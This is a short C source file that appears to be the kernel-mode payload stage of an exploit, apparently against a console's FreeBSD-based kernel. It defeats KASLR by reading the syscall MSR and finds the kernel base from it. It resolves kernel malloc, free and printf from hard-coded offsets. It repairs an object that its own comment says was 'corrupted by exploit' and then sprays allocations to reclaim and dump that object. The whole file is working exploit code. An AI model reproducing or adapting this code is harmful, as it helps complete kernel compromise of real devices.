#include <stddef.h>

#define	KERN_XFAST_SYSCALL			0x30EB30
#define KERN_MALLOC					0x1D1700
#define KERN_FREE 					0x1D18D0
#define KERN_PRINTF					0x347580

int main(void)
{
	int i;
	void *addr;
	uint8_t *ptrKernel;

	int (*printf)(const char *fmt, ...) 						= NULL;
	void *(*malloc)(unsigned long size, void *type, int flags) 	= NULL;
	void (*free)(void *addr, void *type) 						= NULL;

	// Get kbase and resolve kernel symbols
	ptrKernel = (uint8_t *)(rdmsr(0xc0000082) - KERN_XFAST_SYSCALL);
	malloc 	= (void *)&ptrKernel[KERN_MALLOC];
	free 	= (void *)&ptrKernel[KERN_FREE];
	printf 	= (void *)&ptrKernel[KERN_PRINTF];

	uint8_t *objBase = (uint8_t *)(*(uint64_t *)(0xDEAD0000));

	// Fix stuff in object that's corrupted by exploit
	*(uint64_t *)(objBase + 0x0E0) = 0x7773706964;
	*(uint64_t *)(objBase + 0x0F0) = 0;
	*(uint64_t *)(objBase + 0x0F8) = 0;

	// Malloc so object doesn't get smashed
	for (i = 0; i < 512; i++)
	{
		addr = malloc(0x180, &ptrKernel[0x133F680], 0x02);

		printf("Alloc: 0x%lx\n", addr);

		if (addr == (void *)objBase)
			break;

		free(addr, &ptrKernel[0x133F680]);
	}

	printf("Object Dump 0x%lx\n", objBase);

	for (i = 0; i < 0x180; i += 8)
		printf("<Debug> Object + 0x%03x: 0x%lx\n", i, *(uint64_t *)(*(uint64_t *)(0xDEAD0000) + i));

	// EE :)

	return 0;
}
